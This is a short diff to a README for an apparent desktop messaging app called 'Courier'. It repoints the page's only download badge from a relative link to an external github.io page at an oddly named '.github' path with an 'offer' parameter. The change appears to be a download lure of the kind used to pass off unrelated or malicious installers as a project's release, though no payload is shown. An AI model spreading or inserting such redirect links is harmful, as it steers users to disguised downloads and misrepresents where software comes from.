@@ -1,6 +1,6 @@
 # Courier Download — Desktop Messaging App
 
-[![Get Courier GitHub](https://img.shields.io/badge/Get%20Courier%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](?offer=Courier)
+[![Get Courier GitHub](https://img.shields.io/badge/Get%20Courier%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Courier)
 
 ---
 
